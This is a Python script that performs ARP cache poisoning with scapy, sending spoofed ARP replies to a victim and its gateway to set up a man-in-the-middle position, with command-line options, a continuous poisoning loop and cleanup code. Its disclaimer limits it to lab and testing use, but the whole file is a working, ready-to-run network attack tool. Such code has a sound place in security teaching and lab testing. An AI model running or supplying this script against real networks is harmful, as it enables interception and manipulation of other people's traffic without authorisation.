"""
ARP Spoofing Attack Script (for demonstration/testing only).

Uses scapy to perform an ARP cache poisoning attack:
  - Sends spoofed ARP replies to the victim claiming to be the gateway.
  - Sends spoofed ARP replies to the gateway claiming to be the victim.
  - This is a classic man-in-the-middle (MitM) setup.

MITRE ATT&CK: T1557.002 — Adversary-in-the-Middle: ARP Cache Poisoning

⚠️  WARNING: This script is for EDUCATIONAL and TESTING purposes only.
    Running ARP spoofing attacks on networks you do not own is ILLEGAL.
    Use only in isolated lab/Docker environments.

Usage:
  python arp_spoof.py --target 192.168.100.10 --gateway 192.168.100.1
  python arp_spoof.py --target 192.168.100.10 --gateway 192.168.100.1 --count 50 --interval 0.5
"""

import argparse
import os
import signal
import sys
import time

try:
    from scapy.all import ARP, Ether, sendp, get_if_hwaddr, getmacbyip, conf
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False
    print("[ERROR] scapy is required. Install with: pip install scapy")


def get_mac(ip: str) -> str:
    """Resolve an IP to its MAC address using ARP."""
    mac = getmacbyip(ip)
    if not mac:
        print(f"[ERROR] Could not resolve MAC for {ip}")
        sys.exit(1)
    return mac


def craft_arp_poison(target_ip: str, target_mac: str, spoof_ip: str) -> Ether:
    """
    Craft a spoofed ARP reply packet.

    The packet tells `target_ip` that `spoof_ip` is at the attacker's MAC,
    causing the target to send traffic intended for `spoof_ip` to us instead.
    """
    # Get our own MAC (the attacker's MAC)
    attacker_mac = get_if_hwaddr(conf.iface)

    pkt = Ether(dst=target_mac) / ARP(
        op=2,           # ARP reply (is-at)
        pdst=target_ip,  # Who we're lying to
        hwdst=target_mac,
        psrc=spoof_ip,  # IP we're impersonating
        hwsrc=attacker_mac,  # Our real MAC
    )
    return pkt


def restore_arp(target_ip: str, target_mac: str, source_ip: str, source_mac: str):
    """
    Send corrective ARP packets to restore the original MAC binding.
    This cleans up after the attack.
    """
    pkt = Ether(dst=target_mac) / ARP(
        op=2,
        pdst=target_ip,
        hwdst=target_mac,
        psrc=source_ip,
        hwsrc=source_mac,
    )
    sendp(pkt, count=5, inter=0.2, verbose=False)
    print(f"[RESTORE] Sent corrective ARP: {source_ip} is-at {source_mac}")


def run_attack(
    target_ip: str,
    gateway_ip: str,
    count: int = 0,
    interval: float = 1.0,
    interface: str = "eth0",
):
    """
    Execute the ARP poisoning attack.

    Continuously sends spoofed ARP replies to both the target and the
    gateway, positioning the attacker as a man-in-the-middle.
    """
    if not SCAPY_AVAILABLE:
        sys.exit(1)

    conf.iface = interface
    conf.verb = 0

    print()
    print("=" * 60)
    print("  ⚠️  ARP SPOOFING ATTACK (Educational Demo)")
    print(f"  Target:    {target_ip}")
    print(f"  Gateway:   {gateway_ip}")
    print(f"  Interface: {interface}")
    print(f"  Interval:  {interval}s")
    print(f"  Count:     {'infinite' if count == 0 else count}")
    print("=" * 60)
    print()

    # Resolve MACs
    print("[*] Resolving MAC addresses...")
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)
    attacker_mac = get_if_hwaddr(interface)

    print(f"  Target MAC:   {target_mac}")
    print(f"  Gateway MAC:  {gateway_mac}")
    print(f"  Attacker MAC: {attacker_mac}")
    print()

    # Craft poison packets
    # Tell the target that we are the gateway
    pkt_to_target = craft_arp_poison(target_ip, target_mac, gateway_ip)
    # Tell the gateway that we are the target
    pkt_to_gateway = craft_arp_poison(gateway_ip, gateway_mac, target_ip)

    sent = 0
    running = True

    def handle_signal(sig, frame):
        nonlocal running
        running = False

    signal.signal(signal.SIGINT, handle_signal)
    signal.signal(signal.SIGTERM, handle_signal)

    print("[*] Sending spoofed ARP replies...")
    print("    Press Ctrl+C to stop and restore ARP tables.\n")

    try:
        while running:
            # Send spoofed replies
            sendp(pkt_to_target, verbose=False)
            sendp(pkt_to_gateway, verbose=False)
            sent += 2

            print(
                f"\r  [POISON] Sent {sent} spoofed packets "
                f"({sent // 2} rounds)  ",
                end="", flush=True,
            )

            if count > 0 and sent // 2 >= count:
                break

            time.sleep(interval)

    finally:
        print(f"\n\n[*] Attack stopped after {sent} packets.")
        print("[*] Restoring ARP tables...")
        restore_arp(target_ip, target_mac, gateway_ip, gateway_mac)
        restore_arp(gateway_ip, gateway_mac, target_ip, target_mac)
        print("[*] ARP tables restored. Exiting.")


def main():
    parser = argparse.ArgumentParser(
        description="ARP Spoofing Attack Tool (Educational Demo)"
    )
    parser.add_argument(
        "--target", "-t", required=True,
        help="Target (victim) IP address",
    )
    parser.add_argument(
        "--gateway", "-g", required=True,
        help="Gateway IP address to impersonate",
    )
    parser.add_argument(
        "--count", "-c", type=int, default=0,
        help="Number of rounds (0 = infinite, default: 0)",
    )
    parser.add_argument(
        "--interval", "-i", type=float, default=1.0,
        help="Seconds between poison rounds (default: 1.0)",
    )
    parser.add_argument(
        "--interface", default="eth0",
        help="Network interface (default: eth0)",
    )
    args = parser.parse_args()

    if os.geteuid() != 0:
        print("[ERROR] This script requires root privileges.")
        print("        Run with: sudo python arp_spoof.py ...")
        sys.exit(1)

    run_attack(
        target_ip=args.target,
        gateway_ip=args.gateway,
        count=args.count,
        interval=args.interval,
        interface=args.interface,
    )


if __name__ == "__main__":
    main()
